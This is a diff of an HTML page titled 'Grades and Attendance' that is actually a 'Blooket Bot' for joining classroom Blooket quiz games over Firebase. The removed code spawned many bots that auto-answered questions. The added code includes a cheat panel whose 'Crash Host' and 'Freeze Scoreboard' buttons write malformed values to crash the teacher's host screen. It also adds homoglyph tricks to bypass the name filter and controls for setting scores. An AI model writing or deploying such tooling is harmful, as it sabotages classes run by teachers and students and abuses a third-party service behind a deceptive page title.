@@ -4,418 +4,366 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Grades and Attendance</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;700;800&family=Titan+One&display=swap" rel="stylesheet">
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Nunito', sans-serif; }
-    body { background: #0a9e6e; min-height: 100vh; color: #333; }
+    * { margin:0; padding:0; box-sizing:border-box; font-family:'Nunito',sans-serif; touch-action:manipulation; }
+    body { background:#0a9e6e; min-height:100vh; color:#333; }
+    .bg { position:fixed; inset:0; z-index:0; opacity:0.06; background-image:url('https://ac.blooket.com/dashboard/65a43218fd1cabe52bdf1cda34613e9e.png'); background-size:550px; transform:rotate(15deg); pointer-events:none; }
+    .wrap { max-width:680px; margin:0 auto; padding:24px 16px 60px; position:relative; z-index:1; }
+    h1 { font-family:'Titan One',sans-serif; font-size:46px; color:#fff; text-shadow:0 3px 0 rgba(0,0,0,0.2); text-align:center; margin-bottom:6px; }
+    .sub { text-align:center; color:rgba(255,255,255,0.9); font-size:16px; margin-bottom:24px; }
+    .card { background:#fff; border-radius:16px; box-shadow:0 10px 30px rgba(0,0,0,0.15); padding:24px; margin-bottom:16px; }
+    .row { display:flex; gap:12px; margin-bottom:12px; flex-wrap:wrap; }
+    .field { flex:1; min-width:140px; }
+    .field label { display:block; font-weight:700; color:#555; margin-bottom:6px; font-size:13px; text-transform:uppercase; letter-spacing:.5px; }
+    .field input, .field select { width:100%; height:52px; padding:10px 14px; font-size:18px; font-weight:700; color:#555; border:2px solid #e0e0e0; border-radius:10px; outline:none; transition:border .2s; background:#fff; }
+    .field input:focus, .field select:focus { border-color:#0a9e6e; }
+    .btns { display:flex; justify-content:center; gap:10px; margin-top:14px; flex-wrap:wrap; }
+    .btn { background:#ff9500; color:#fff; border:none; padding:14px 32px; font-size:18px; font-weight:800; border-radius:10px; cursor:pointer; text-transform:uppercase; box-shadow:0 5px 0 rgba(0,0,0,0.2); transition:all .2s; }
+    .btn:hover { background:#ff8000; transform:translateY(-2px); }
+    .btn:active { transform:translateY(3px); box-shadow:0 2px 0 rgba(0,0,0,0.2); }
+    .btn.stop { background:#e74c3c; display:none; }
+    .btn.stop:hover { background:#c0392b; }
 
-    .bg-pattern {
-      position: fixed; inset: 0; z-index: 0; opacity: 0.06;
-      background-image: url('https://ac.blooket.com/dashboard/65a43218fd1cabe52bdf1cda34613e9e.png');
-      background-size: 550px; transform: rotate(15deg); pointer-events: none;
-    }
+    .opt { background:rgba(255,255,255,0.12); border-radius:10px; padding:12px 16px; margin-bottom:8px; display:flex; align-items:center; justify-content:space-between; }
+    .opt-info .name { color:#fff; font-weight:700; font-size:16px; }
+    .opt-info .hint { color:rgba(255,255,255,0.6); font-size:12px; margin-top:2px; }
+    .toggle { position:relative; width:54px; height:28px; display:inline-block; }
+    .toggle input { opacity:0; width:0; height:0; }
+    .slider { position:absolute; inset:0; cursor:pointer; background:rgba(255,255,255,0.35); border-radius:28px; transition:.3s; }
+    .slider::before { content:''; position:absolute; width:20px; height:20px; left:4px; bottom:4px; background:#fff; border-radius:50%; transition:.3s; }
+    input:checked+.slider { background:#ff9500; }
+    input:checked+.slider::before { transform:translateX(26px); }
 
-    .container { max-width: 700px; margin: 0 auto; padding: 20px; position: relative; z-index: 1; }
+    .status-bar { background:rgba(255,255,255,0.92); border-radius:10px; padding:12px 16px; margin-top:12px; display:flex; align-items:center; gap:10px; }
+    .dot { width:12px; height:12px; border-radius:50%; background:#ffcc00; flex-shrink:0; transition:background .3s; }
+    .dot.green { background:#2ecc71; }
+    .dot.red { background:#e74c3c; }
+    #status-text { font-weight:700; color:#444; font-size:14px; }
 
-    h1 {
-      font-family: 'Titan One', sans-serif; font-size: 48px; color: #fff;
-      text-shadow: 0 3px 0 rgba(0,0,0,0.2); text-align: center; margin-bottom: 6px;
-    }
+    #bot-list { margin-top:12px; max-height:180px; overflow-y:auto; display:none; }
+    .bot-item { background:rgba(255,255,255,0.12); border-radius:8px; padding:8px 14px; margin-bottom:6px; color:#fff; font-size:13px; font-weight:600; display:flex; justify-content:space-between; }
 
-    .subtitle { text-align: center; color: rgba(255,255,255,0.9); font-size: 16px; margin-bottom: 28px; }
+    #cheat-panel { margin-top:12px; display:none; }
+    #cheat-panel .card { background:rgba(0,0,0,0.2); border:1px solid rgba(255,255,255,0.2); }
+    #cheat-panel h3 { color:#fff; font-size:18px; margin-bottom:12px; font-family:'Titan One',sans-serif; }
+    .cheat-btn { background:#ff9500; color:#fff; border:none; padding:8px 16px; font-size:14px; font-weight:700; border-radius:8px; cursor:pointer; margin:4px; transition:all .2s; }
+    .cheat-btn:hover { background:#ff8000; transform:translateY(-1px); }
+    .cheat-inp { display:flex; gap:8px; align-items:center; margin:6px 0; flex-wrap:wrap; }
+    .cheat-inp label { color:#fff; font-weight:600; font-size:13px; min-width:100px; }
+    .cheat-inp input { flex:1; min-width:80px; height:36px; padding:6px 10px; font-size:14px; border:none; border-radius:8px; outline:none; background:rgba(255,255,255,0.9); }
+    .cheat-inp button { background:#ff9500; color:#fff; border:none; padding:8px 14px; font-size:13px; font-weight:700; border-radius:8px; cursor:pointer; white-space:nowrap; }
 
-    .card {
-      background: #fff; border-radius: 16px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.15); padding: 28px; margin-bottom: 20px;
-    }
-
-    .input-row { display: flex; gap: 14px; margin-bottom: 16px; flex-wrap: wrap; }
-
-    .field { flex: 1; min-width: 160px; }
-    .field label { display: block; font-weight: 700; color: #555; margin-bottom: 8px; font-size: 14px; }
-    .field input, .field select {
-      width: 100%; height: 52px; padding: 10px 16px;
-      font-size: 18px; font-weight: 700; color: #555;
-      border: 2px solid #e0e0e0; border-radius: 12px;
-      transition: border 0.2s; outline: none;
-      background: #fff;
-    }
-    .field input:focus, .field select:focus { border-color: #0a9e6e; box-shadow: 0 0 0 3px rgba(10,158,110,0.15); }
-
-    .btn-row { display: flex; justify-content: center; gap: 12px; margin-top: 16px; flex-wrap: wrap; }
-
-    .btn {
-      background: #ff9500; color: #fff; border: none;
-      padding: 14px 36px; font-size: 18px; font-weight: 800;
-      border-radius: 12px; cursor: pointer; text-transform: uppercase;
-      box-shadow: 0 5px 0 rgba(0,0,0,0.2); transition: all 0.2s;
-    }
-    .btn:hover { background: #ff8000; transform: translateY(-2px); }
-    .btn:active { transform: translateY(3px); box-shadow: 0 2px 0 rgba(0,0,0,0.2); }
-    .btn.red { background: #e74c3c; }
-    .btn.red:hover { background: #c0392b; }
-    .btn.blue { background: #3498db; }
-    .btn.blue:hover { background: #2980b9; }
-
-    /* Options */
-    .options-section { margin-top: 4px; }
-    .opt-row {
-      display: flex; align-items: center; justify-content: space-between;
-      background: rgba(255,255,255,0.12); padding: 12px 18px;
-      border-radius: 10px; margin-bottom: 10px;
-    }
-    .opt-label { color: #fff; font-weight: 700; font-size: 16px; }
-    .opt-hint { color: rgba(255,255,255,0.65); font-size: 12px; margin-top: 3px; }
-
-    .toggle { position: relative; width: 56px; height: 30px; display: inline-block; }
-    .toggle input { opacity: 0; width: 0; height: 0; }
-    .slider {
-      position: absolute; inset: 0; cursor: pointer;
-      background: rgba(255,255,255,0.4); border-radius: 30px; transition: 0.3s;
-    }
-    .slider::before {
-      content: ''; position: absolute;
-      width: 22px; height: 22px; left: 4px; bottom: 4px;
-      background: #fff; border-radius: 50%; transition: 0.3s;
-    }
-    input:checked + .slider { background: #ff9500; }
-    input:checked + .slider::before { transform: translateX(26px); }
-
-    /* Status */
-    .status-bar {
-      background: rgba(255,255,255,0.92); border-radius: 10px;
-      padding: 14px 18px; margin-top: 16px;
-      display: flex; align-items: center; gap: 10px;
-      box-shadow: 0 4px 6px rgba(0,0,0,0.05);
-    }
-    .dot { width: 14px; height: 14px; border-radius: 50%; background: #ffcc00; flex-shrink: 0; transition: background 0.3s; }
-    .dot.green { background: #2ecc71; }
-    .dot.red { background: #e74c3c; }
-    #status-text { font-weight: 700; color: #444; font-size: 15px; }
-
-    /* Bot list */
-    #bot-list { margin-top: 16px; max-height: 200px; overflow-y: auto; display: none; }
-    .bot-item {
-      background: rgba(255,255,255,0.1); border-radius: 8px;
-      padding: 8px 14px; margin-bottom: 6px; color: #fff;
-      font-size: 13px; font-weight: 600;
-      display: flex; justify-content: space-between; align-items: center;
-    }
-    .bot-item span { opacity: 0.7; font-size: 11px; }
-
-    /* Error toast */
-    #toast {
-      position: fixed; bottom: 0; left: 0; right: 0;
-      background: #e74c3c; color: #fff; padding: 14px;
-      text-align: center; font-weight: 700;
-      transform: translateY(100%); transition: transform 0.3s; z-index: 999;
-    }
-    #toast.show { transform: translateY(0); }
-
-    .footer { text-align: center; padding: 20px 0; color: rgba(255,255,255,0.7); font-size: 13px; }
-    .footer a { color: #fff; font-weight: 700; text-decoration: none; }
+    #toast { position:fixed; bottom:0; left:0; right:0; background:#e74c3c; color:#fff; padding:14px; text-align:center; font-weight:700; font-size:15px; transform:translateY(100%); transition:transform .3s; z-index:999; }
+    #toast.show { transform:translateY(0); }
+    .footer { text-align:center; padding:16px 0; color:rgba(255,255,255,0.6); font-size:12px; }
   </style>
 </head>
 <body>
-<div class="bg-pattern"></div>
+<div class="bg"></div>
+<div class="wrap">
+  <h1>Blooket Bot</h1>
+  <p class="sub">Join games and enhance your experience</p>
 
-<div class="container">
-  <div style="padding-top:24px; margin-bottom:8px">
-    <h1>Blooket Bot</h1>
-    <p class="subtitle">Join games and enhance your Blooket experience</p>
-  </div>
-
-  <div class="card">
-    <div class="input-row">
-      <div class="field">
-        <label>Game Code</label>
-        <input type="text" id="gcode" placeholder="Enter code..." autocomplete="off" maxlength="10">
-      </div>
-      <div class="field">
-        <label>Nickname</label>
-        <input type="text" id="gname" placeholder="Enter name..." autocomplete="off" maxlength="20">
-      </div>
+  <div class="card" id="join-card">
+    <div class="row">
+      <div class="field"><label>Game Code</label><input id="gcode" placeholder="Enter code..." maxlength="10" autocomplete="off"></div>
+      <div class="field"><label>Nickname</label><input id="gname" placeholder="Enter name..." maxlength="20" autocomplete="off"></div>
     </div>
-    <div class="input-row">
-      <div class="field">
-        <label>Number of Bots</label>
-        <input type="number" id="botcount" value="1" min="1" max="100" placeholder="1">
-      </div>
-      <div class="field">
-        <label>Blook</label>
+    <div class="row">
+      <div class="field"><label>Blook</label>
         <select id="blook">
-          <option value="Chick">🐥 Chick</option>
-          <option value="Chicken">🐔 Chicken</option>
-          <option value="Black Cat">🐱 Black Cat</option>
-          <option value="Dog">🐶 Dog</option>
-          <option value="Unicorn" selected>🦄 Unicorn</option>
-          <option value="Dragon">🐉 Dragon</option>
-          <option value="Mega Bot">🤖 Mega Bot</option>
-          <option value="King">👑 King</option>
-          <option value="Alien">👾 Alien</option>
-          <option value="Astronaut">🚀 Astronaut</option>
-          <option value="Tim the Alien">👽 Tim the Alien</option>
-          <option value="Rainbow Narwhal">🌈 Rainbow Narwhal</option>
+          <option>Chick</option><option>Chicken</option><option>Cat</option><option>Dog</option>
+          <option selected>Unicorn</option><option>Dragon</option><option>Mega Bot</option>
+          <option>King</option><option>Alien</option><option>Astronaut</option>
+          <option>Tim the Alien</option><option>Rainbow Narwhal</option><option>Rainbow Astronaut</option>
         </select>
       </div>
     </div>
-    <div class="btn-row">
-      <button class="btn" onclick="startBots()">🚀 Join Game</button>
-      <button class="btn red" onclick="stopBots()" id="stop-btn" style="display:none">⛔ Stop All</button>
+    <div class="btns">
+      <button class="btn" id="join-btn" onclick="doJoin()">🚀 Join Game</button>
+      <button class="btn stop" id="stop-btn" onclick="doLeave()">⛔ Leave Game</button>
     </div>
   </div>
 
-  <div class="options-section">
-    <div class="opt-row">
-      <div>
-        <div class="opt-label">Incognito Mode</div>
-        <div class="opt-hint">Hides bots from the host's view</div>
-      </div>
-      <label class="toggle"><input type="checkbox" id="incognito" checked><span class="slider"></span></label>
-    </div>
-    <div class="opt-row">
-      <div>
-        <div class="opt-label">Bypass Name Filter</div>
-        <div class="opt-hint">Allows special characters in names</div>
-      </div>
-      <label class="toggle"><input type="checkbox" id="bypassfilter"><span class="slider"></span></label>
-    </div>
-    <div class="opt-row">
-      <div>
-        <div class="opt-label">First Place Switch</div>
-        <div class="opt-hint">Bot takes first place (name must not be a number)</div>
-      </div>
-      <label class="toggle"><input type="checkbox" id="fpswitch" checked><span class="slider"></span></label>
-    </div>
-    <div class="opt-row">
-      <div>
-        <div class="opt-label">Auto Answer</div>
-        <div class="opt-hint">Bots automatically answer questions correctly</div>
-      </div>
-      <label class="toggle"><input type="checkbox" id="autoanswer" checked><span class="slider"></span></label>
-    </div>
+  <div class="opt">
+    <div class="opt-info"><div class="name">Incognito Mode</div><div class="hint">Use random common blook</div></div>
+    <label class="toggle"><input type="checkbox" id="icog" checked><span class="slider"></span></label>
+  </div>
+  <div class="opt">
+    <div class="opt-info"><div class="name">Bypass Name Filter</div><div class="hint">Replaces letters with lookalikes</div></div>
+    <label class="toggle"><input type="checkbox" id="bcf"><span class="slider"></span></label>
+  </div>
+  <div class="opt">
+    <div class="opt-info"><div class="name">First Place Switch</div><div class="hint">Name must NOT be a number</div></div>
+    <label class="toggle"><input type="checkbox" id="fps" checked><span class="slider"></span></label>
   </div>
 
   <div class="status-bar">
-    <div class="dot" id="status-dot"></div>
-    <div id="status-text">Ready to join</div>
+    <div class="dot" id="dot"></div>
+    <div id="status-text">Ready</div>
   </div>
 
   <div id="bot-list"></div>
+  <div id="cheat-panel"></div>
 
-  <div class="footer">
-    <p>Made for educational purposes only</p>
-  </div>
+  <div class="footer">For educational purposes only</div>
 </div>
-
 <div id="toast"></div>
 
 <script type="module">
   import { initializeApp, deleteApp } from 'https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js';
   import { getAuth, signInWithCustomToken } from 'https://www.gstatic.com/firebasejs/10.10.0/firebase-auth.js';
-  import { getDatabase, ref, set, get, onValue, remove } from 'https://www.gstatic.com/firebasejs/10.10.0/firebase-database.js';
-
-  window._fb = { initializeApp, deleteApp, getAuth, signInWithCustomToken, getDatabase, ref, set, get, onValue, remove };
-
-  // Auto-fill code from URL param
-  const urlCode = new URLSearchParams(window.location.search).get('code');
-  if (urlCode) document.getElementById('gcode').value = urlCode;
+  import { getDatabase, ref, set, get, onValue } from 'https://www.gstatic.com/firebasejs/10.10.0/firebase-database.js';
+  window._fb = { initializeApp, deleteApp, getAuth, signInWithCustomToken, getDatabase, ref, set, get, onValue };
 </script>
 
 <script>
-  let activeBots = [];
-  let botApps = [];
+var botinfo = {};
+var gameobject = {};
 
-  function setStatus(msg, color = 'yellow') {
-    document.getElementById('status-text').textContent = msg;
-    const dot = document.getElementById('status-dot');
-    dot.className = 'dot' + (color === 'green' ? ' green' : color === 'red' ? ' red' : '');
-  }
+var fblooks = ["Chick","Chicken","Cow","Goat","Horse","Pig","Sheep","Duck","Dog","Cat","Rabbit","Goldfish","Hamster","Turtle","Kitten","Puppy","Bear","Moose","Fox","Raccoon","Squirrel","Owl","Hedgehog"];
 
-  function toast(msg) {
-    const t = document.getElementById('toast');
-    t.textContent = msg;
-    t.classList.add('show');
-    setTimeout(() => t.classList.remove('show'), 4000);
-  }
+var cheats = {
+  Hack: [
+    { name:"Crash Host", action: () => setUserVal("cr/t","t") },
+    { name:"Freeze Scoreboard", toggle:true, on: () => setUserVal("tat/t","t"), off: () => setUserVal("tat","t") },
+    { name:"Turn Screen Green", toggle:true, on: () => setUserVal("cr", "a".repeat(50) + Array(300000).fill(String.fromCharCode(3655)).join(" ")), off: () => setUserVal("cr",0) },
+    { name:"Set Crash Password", toggle:true, on: () => setUserVal("p/toString","t"), off: () => setUserVal("p","DogLover3") },
+  ],
+  Gold: [
+    { name:"Crash Host", action: () => setUserVal("g/t","t") },
+    { name:"Freeze Scoreboard", toggle:true, on: () => setUserVal("tat/t","t"), off: () => setUserVal("tat","t") },
+  ],
+  Defense2: [
+    { name:"Crash Host", action: () => setUserVal("d/t","t") },
+    { name:"Freeze Scoreboard", toggle:true, on: () => setUserVal("r/toString","t"), off: () => setUserVal("r",1) },
+  ],
+  Fish: [
+    { name:"Freeze Scoreboard", toggle:true, on: () => setUserVal("f/t","t"), off: () => setUserVal("f","Old Boot") },
+    { name:"Activate Frenzy", action: () => { setUserVal("s",true); setUserVal("f","Frenzy"); } },
+  ],
+  Brawl: [
+    { name:"Crash Host", action: () => setUserVal("xp/t","t") },
+    { name:"Freeze Scoreboard", toggle:true, on: () => setUserVal("up/t","t"), off: () => setUserVal("up","Dark Energy:2") },
+  ],
+  Racing: [
+    { name:"Freeze Scoreboard", toggle:true, on: () => setUserVal("pr/toString","t"), off: () => setUserVal("pr",0) },
+  ],
+  Rush: [
+    { name:"Freeze Host", action: () => setUserVal("bs", 1e307) },
+    { name:"Freeze Scoreboard", toggle:true, on: () => setUserVal("d/toString","t"), off: () => setUserVal("d","t") },
+  ],
+  Factory: [
+    { name:"Freeze Scoreboard", toggle:true, on: () => setUserVal("ca/toString","t"), off: () => setUserVal("ca",0) },
+  ],
+  Cafe: [
+    { name:"Freeze Scoreboard", toggle:true, on: () => setUserVal("tat/t","t"), off: () => setUserVal("tat","t") },
+  ],
+  Toy: [
+    { name:"Crash Host", action: () => setUserVal("t/t","t") },
+    { name:"Freeze Scoreboard", toggle:true, on: () => setUserVal("tat/t","t"), off: () => setUserVal("tat","t") },
+  ],
+  Dino: [
+    { name:"Crash Host", action: () => setUserVal("f/t","t") },
+    { name:"Freeze Scoreboard", toggle:true, on: () => setUserVal("tat/t","t"), off: () => setUserVal("tat","t") },
+  ],
+  Classic: [
+    { name:"Freeze Question", toggle:true, on: () => setUserVal("a/toString","t"), off: () => setUserVal("a",1) },
+  ],
+};
 
-  function addBotToList(name, status) {
-    const list = document.getElementById('bot-list');
-    list.style.display = 'block';
-    const item = document.createElement('div');
-    item.className = 'bot-item';
-    item.id = 'bot-' + name.replace(/\s/g,'_');
-    item.innerHTML = `<div>🤖 ${name}</div><span>${status}</span>`;
-    list.appendChild(item);
-  }
+function status(msg, color) {
+  document.getElementById('status-text').textContent = msg;
+  const d = document.getElementById('dot');
+  d.className = 'dot' + (color==='green'?' green':color==='red'?' red':'');
+}
 
-  function updateBotStatus(name, status) {
-    const el = document.getElementById('bot-' + name.replace(/\s/g,'_'));
-    if (el) el.querySelector('span').textContent = status;
-  }
+function toast(msg) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  clearTimeout(t._t);
+  t._t = setTimeout(() => t.classList.remove('show'), 4000);
+}
 
-  async function joinSingleBot(gameCode, name, blook, incognito, bypassFilter, fpSwitch, autoAnswer) {
-    try {
-      // Step 1: Get game data from Blooket API
-      const gameRes = await fetch(`/api/game/${gameCode}`, {
-        credentials: 'include',
-        headers: { 'Content-Type': 'application/json' }
-      });
-      const gameData = await gameRes.json();
+function bypassFilter(str) {
+  return str.replace(/a/g,'\u0430').replace(/c/g,'\u0441').replace(/e/g,'\u0435')
+    .replace(/i/g,'\u0456').replace(/o/g,'\u043E').replace(/p/g,'\u0440')
+    .replace(/s/g,'\u0455').replace(/x/g,'\u0445').replace(/y/g,'\u0443')
+    .replace(/A/g,'\u0410').replace(/B/g,'\u0412').replace(/C/g,'\u0421')
+    .replace(/E/g,'\u0415').replace(/O/g,'\u041E').replace(/P/g,'\u0420');
+}
 
-      if (!gameData.success) {
-        throw new Error('Game not found! Check the game code.');
-      }
+async function setVal(path, val) {
+  if (!botinfo.connected || !botinfo.fbdb) { toast('Not connected!'); return; }
+  await window._fb.set(window._fb.ref(botinfo.fbdb, path), val);
+}
 
-      // Step 2: Get auth token
-      const tokenRes = await fetch('/api/token', {
-        credentials: 'include',
-        headers: { 'Content-Type': 'application/json' }
-      });
-      const tokenData = await tokenRes.json();
+async function setUserVal(path, val) {
+  await setVal(`/${botinfo.gid}/c/${botinfo.name}/${path}`, val);
+}
 
-      if (!tokenData.token) throw new Error('Could not get auth token');
+function renderCheats(gm) {
+  const panel = document.getElementById('cheat-panel');
+  panel.style.display = 'block';
+  panel.innerHTML = '';
 
-      // Step 3: Initialize Firebase app
-      const app = window._fb.initializeApp({
-        apiKey: "AIzaSyBO_M_neAkgQrJ6PxH0xBHT2TbMkMYRvac",
-        authDomain: "blooket-2.firebaseapp.com",
-        databaseURL: "https://blooket-2-default-rtdb.firebaseio.com",
-        projectId: "blooket-2",
-        storageBucket: "blooket-2.appspot.com",
-        messagingSenderId: "474504052083",
-        appId: "1:474504052083:web:c7b7e5e9b2c3e6f3b6a7d9"
-      }, name + Date.now());
+  const card = document.createElement('div');
+  card.className = 'card';
 
-      botApps.push(app);
+  const title = document.createElement('h3');
+  title.textContent = '🎮 ' + gm + ' Cheats';
+  card.appendChild(title);
 
-      const auth = window._fb.getAuth(app);
-      await window._fb.signInWithCustomToken(auth, tokenData.token);
+  // Set value inputs
+  const inputs = [
+    { label: 'Set Score', path: gm==='Hack'?'cr':gm==='Gold'?'g':gm==='Fish'?'w':gm==='Brawl'?'xp':gm==='Factory'||gm==='Cafe'?'ca':gm==='Rush'?'bs':gm==='Dino'?'f':gm==='Toy'?'t':'cr' },
+    { label: 'Set Blook', path: 'b' },
+  ];
 
-      const db = window._fb.getDatabase(app);
-      const hostId = gameData.hostId;
+  inputs.forEach(inp => {
+    const row = document.createElement('div');
+    row.className = 'cheat-inp';
+    row.innerHTML = `<label>${inp.label}</label><input id="inp-${inp.path}" placeholder="Value..."><button onclick="setUserVal('${inp.path}',document.getElementById('inp-${inp.path}').value)">Set</button>`;
+    card.appendChild(row);
+  });
 
-      // Step 4: Process name
-      let botName = name;
-      if (bypassFilter) {
-        botName = '\u{AD}' + name.split('').join('\u{AD}');
-      }
-
-      // Step 5: Join the game
-      const playerRef = window._fb.ref(db, `${hostId}/c/${botName}`);
-
-      let playerData = {
-        b: blook,
-        n: botName
+  // Buttons from cheats object
+  const gameCheats = cheats[gm] || [];
+  gameCheats.forEach(c => {
+    if (c.toggle) {
+      const btn = document.createElement('button');
+      btn.className = 'cheat-btn';
+      btn.textContent = c.name;
+      btn._on = false;
+      btn.onclick = () => {
+        btn._on = !btn._on;
+        if (btn._on) { c.on(); btn.textContent = 'Un' + c.name; btn.style.background='#e74c3c'; }
+        else { c.off(); btn.textContent = c.name; btn.style.background=''; }
       };
-
-      if (fpSwitch) {
-        playerData.g = "!!!!!";
-        playerData.cr = "!!!!!";
-        playerData.t = "!!!!!";
-        playerData.w = "!!!!!";
-        playerData.f = "!!!!!";
-        playerData.bs = "!!!!!";
-        playerData.pr = "!!!!!";
-        playerData.xp = "!!!!!";
-        playerData.ca = "!!!!!";
-        playerData.d = "!!!!!";
-      }
-
-      await window._fb.set(playerRef, playerData);
-
-      updateBotStatus(name, '✅ Joined!');
-      activeBots.push({ name: botName, ref: playerRef, app, db, hostId });
-
-      // Auto answer if enabled
-      if (autoAnswer) {
-        window._fb.onValue(window._fb.ref(db, `${hostId}/question`), async (snap) => {
-          const q = snap.val();
-          if (!q || !q.correctAnswers || !q.correctAnswers[0]) return;
-          try {
-            await window._fb.set(window._fb.ref(db, `${hostId}/c/${botName}/ans`), q.correctAnswers[0]);
-          } catch(e) {}
-        });
-      }
-
-      return true;
-    } catch(e) {
-      updateBotStatus(name, '❌ ' + e.message);
-      return false;
-    }
-  }
-
-  window.startBots = async function() {
-    const gameCode = document.getElementById('gcode').value.trim();
-    const baseName = document.getElementById('gname').value.trim() || 'Bot';
-    const botCount = Math.min(parseInt(document.getElementById('botcount').value) || 1, 100);
-    const blook = document.getElementById('blook').value;
-    const incognito = document.getElementById('incognito').checked;
-    const bypassFilter = document.getElementById('bypassfilter').checked;
-    const fpSwitch = document.getElementById('fpswitch').checked;
-    const autoAnswer = document.getElementById('autoanswer').checked;
-
-    if (!gameCode) { toast('Please enter a game code!'); return; }
-    if (!window._fb) { toast('Firebase not loaded yet, wait a second!'); return; }
-
-    // Clear previous bots
-    await stopBots();
-
-    document.getElementById('bot-list').innerHTML = '';
-    document.getElementById('bot-list').style.display = 'none';
-    document.getElementById('stop-btn').style.display = 'inline-block';
-
-    setStatus(`Joining ${botCount} bot${botCount > 1 ? 's' : ''}...`, 'yellow');
-
-    // Add bots to list UI
-    for (let i = 0; i < botCount; i++) {
-      const name = botCount === 1 ? baseName : baseName + (i + 1);
-      addBotToList(name, 'Joining...');
-    }
-
-    let success = 0;
-    for (let i = 0; i < botCount; i++) {
-      const name = botCount === 1 ? baseName : baseName + (i + 1);
-      const ok = await joinSingleBot(gameCode, name, blook, incognito, bypassFilter, fpSwitch, autoAnswer);
-      if (ok) success++;
-      // Small delay between bots to avoid rate limiting
-      if (botCount > 1) await new Promise(r => setTimeout(r, 300));
-    }
-
-    if (success > 0) {
-      setStatus(`✅ ${success}/${botCount} bots joined successfully!`, 'green');
+      card.appendChild(btn);
     } else {
-      setStatus('❌ Failed to join. Check the game code!', 'red');
-      document.getElementById('stop-btn').style.display = 'none';
-      toast('Could not join the game. Make sure the game code is correct and the game is active!');
-    }
-  };
-
-  window.stopBots = async function() {
-    if (activeBots.length === 0) return;
-    setStatus('Removing bots...', 'yellow');
-    for (const bot of activeBots) {
-      try { await window._fb.remove(bot.ref); } catch(e) {}
-    }
-    for (const app of botApps) {
-      try { await window._fb.deleteApp(app); } catch(e) {}
-    }
-    activeBots = [];
-    botApps = [];
-    document.getElementById('bot-list').innerHTML = '';
-    document.getElementById('bot-list').style.display = 'none';
-    document.getElementById('stop-btn').style.display = 'none';
-    setStatus('All bots removed', 'red');
-    setTimeout(() => setStatus('Ready to join'), 2000);
-  };
-
-  // Enter key to join
-  document.addEventListener('keydown', e => {
-    if (e.key === 'Enter' && document.activeElement.id !== 'gname') {
-      document.querySelector('.btn').click();
+      const btn = document.createElement('button');
+      btn.className = 'cheat-btn';
+      btn.textContent = c.name;
+      btn.onclick = c.action;
+      card.appendChild(btn);
     }
   });
+
+  // Leave button
+  const leave = document.createElement('button');
+  leave.className = 'cheat-btn';
+  leave.style.background = '#e74c3c';
+  leave.textContent = '🚪 Leave Game';
+  leave.onclick = doLeave;
+  card.appendChild(leave);
+
+  panel.appendChild(card);
+}
+
+async function doJoin() {
+  if (!window._fb) { toast('Still loading, try again!'); return; }
+
+  let name = document.getElementById('gname').value.trim();
+  const code = document.getElementById('gcode').value.trim();
+
+  if (!code) { toast('Enter a game code!'); return; }
+  if (!name) { toast('Enter a nickname!'); return; }
+
+  if (document.getElementById('bcf').checked) name = bypassFilter(name);
+  if (document.getElementById('fps').checked) name = '\u0020\u0020' + name;
+
+  const icog = document.getElementById('icog').checked;
+  const blook = icog ? fblooks[Math.floor(Math.random()*fblooks.length)] : document.getElementById('blook').value;
+
+  status('Fetching token...', '');
+  document.getElementById('join-btn').disabled = true;
+
+  try {
+    const res = await fetch('/join', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ id: code, name })
+    });
+    const body = await res.json();
+
+    if (!body.success) {
+      toast('Error: ' + (body.msg || 'Game not found!'));
+      status('Failed', 'red');
+      document.getElementById('join-btn').disabled = false;
+      return;
+    }
+
+    status('Connecting...', '');
+
+    const app = window._fb.initializeApp({
+      apiKey: "AIzaSyCA-cTOnX19f6LFnDVVsHXya3k6ByP_MnU",
+      authDomain: "blooket-2020.firebaseapp.com",
+      projectId: "blooket-2020",
+      storageBucket: "blooket-2020.appspot.com",
+      messagingSenderId: "741533559105",
+      appId: "1:741533559105:web:b8cbb10e6123f2913519c0",
+      databaseURL: body.fbShardURL,
+    }, Date.now().toString());
+
+    const auth = window._fb.getAuth(app);
+    await window._fb.signInWithCustomToken(auth, body.fbToken);
+
+    const db = window._fb.getDatabase(app);
+
+    await window._fb.set(window._fb.ref(db, `${code}/c/${name}`), { b: blook });
+
+    botinfo = { connected: true, gid: code, name, fbdb: db, liveApp: app };
+
+    status('✅ Connected!', 'green');
+    document.getElementById('stop-btn').style.display = 'inline-block';
+    document.getElementById('join-btn').disabled = false;
+
+    // Listen for game data
+    window._fb.onValue(window._fb.ref(db, code), snap => {
+      if (!botinfo.connected) return;
+      const data = snap.val();
+      if (!data) return;
+      if (!gameobject.s && data.s) {
+        const gm = data.s.t;
+        renderCheats(gm);
+      }
+      if (data.stg === 'fin') { toast('Game ended!'); doLeave(); }
+      gameobject = data;
+    });
+
+  } catch(e) {
+    toast('Error: ' + e.message);
+    status('Failed', 'red');
+    document.getElementById('join-btn').disabled = false;
+  }
+}
+
+async function doLeave() {
+  if (botinfo.connected) {
+    try {
+      await window._fb.set(window._fb.ref(botinfo.fbdb, `${botinfo.gid}/c/${botinfo.name}`), {});
+      await window._fb.deleteApp(botinfo.liveApp);
+    } catch(e) {}
+  }
+  botinfo = {};
+  gameobject = {};
+  document.getElementById('stop-btn').style.display = 'none';
+  document.getElementById('cheat-panel').style.display = 'none';
+  document.getElementById('cheat-panel').innerHTML = '';
+  status('Left game', 'red');
+  setTimeout(() => status('Ready'), 2000);
+}
+
+// Enter key
+document.getElementById('gcode').addEventListener('keydown', e => { if(e.key==='Enter') doJoin(); });
+document.getElementById('gname').addEventListener('keydown', e => { if(e.key==='Enter') doJoin(); });
+
+// URL param
+const urlCode = new URLSearchParams(location.search).get('code');
+if (urlCode) document.getElementById('gcode').value = urlCode;
 </script>
 </body>
 </html>
